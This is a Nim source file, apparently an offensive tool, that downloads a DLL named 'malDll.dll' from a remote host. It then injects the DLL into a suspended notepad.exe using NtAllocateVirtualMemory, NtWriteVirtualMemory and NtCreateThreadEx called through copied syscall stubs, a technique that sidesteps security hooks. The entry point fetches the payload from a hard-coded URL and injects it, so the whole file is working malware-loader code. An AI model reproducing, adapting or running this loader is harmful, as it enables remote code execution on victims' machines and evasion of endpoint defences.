import httpclient
import winim
import os
import dynlib
import strutils
import ptr_math
import GetSyscallStub
import osproc

proc VirtAEx*(hProcess: HANDLE, lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID
  {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualAllocEx".}

proc VirtProt*(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): BOOL 
  {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualProtect".}

proc GetCPID*(): DWORD
  {.discardable, stdcall, dynlib: "kernel32", importc: "GetCurrentProcessId".}

proc OpenP*(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD): HANDLE
  {.discardable, stdcall, dynlib: "kernel32", importc: "OpenProcess".}

type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc injct(name: string): void =
    let k32Str: string = "kernel32.dll"
    let loadlibAStr: string = "LoadLibraryA"
    let tProcStr: string = "notepad.exe"
    var SYSCALL_STUB_SIZE: int = 23;

    let tProcess = startProcess(tProcStr)
    tProcess.suspend()
    defer: tProcess.close()

    echo "[*] Target P: ", tProcess.processID

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var dll_size: SIZE_T = cast[SIZE_T](name.len)

    cid.UniqueProcess = tProcess.processID
    
    let tProcess2 = GetCPID()
    var pHandle2: HANDLE = OpenP(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    let syscallStub_NtOpenP = VirtAEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )

    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP));
    VirtProt(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc));
    VirtProt(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite));
    VirtProt(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate));
    VirtProt(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL
    
    let
        ntOPStr: LPCSTR = "NtOpenProcess"
        ntAVMStr: LPCSTR = "NtAllocateVirtualMemory"
        ntWVMStr: LPCSTR = "NtWriteVirtualMemory"
        ntCTEStr: LPCSTR = "NtCreateThreadEx"

    success = GetSyscallStub(ntOPStr, cast[LPVOID](syscallStub_NtOpenP));
    success = GetSyscallStub(ntAVMStr, cast[LPVOID](syscallStub_NtAlloc));
    success = GetSyscallStub(ntWVMStr, cast[LPVOID](syscallStub_NtWrite));
    success = GetSyscallStub(ntCTEStr, cast[LPVOID](syscallStub_NtCreate));

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )

    echo "[*] proc Han: ", pHandle

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &dll_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE);

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        name.cstring, 
        dll_size-1, 
        addr bytesWritten);

    echo "[*] NtWVirtMem: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""

    let k32 = loadLib(k32Str)
    let llAddress = k32.symAddr(loadlibAStr)

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        cast[LPTHREAD_START_ROUTINE](llAddress), 
        ds, FALSE, 0, 0, 0, NULL);

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo "[*] t Han: ", tHandle
    echo "[+] Success!"
    echo success
   
proc dwnld(url: string): bool =
    let client = newHttpClient()
    let fileContent = client.getContent(url)
    try:
        let file = open("malDll.dll", fmWrite)
        defer: file.close()
        file.write(fileContent)
        echo "[+] Download Successful"
        return true
    except:
        echo "[-] Download Failed"
        return false

when defined(windows):
    when defined(amd64):
        when isMainModule:
            if dwnld("http://hjudhsfauifbhjdbashgfbuiwegfbd6746789.net/malDll.dll"):
                injct("malDll.dll")
                var pauseEx = readLine(stdin)
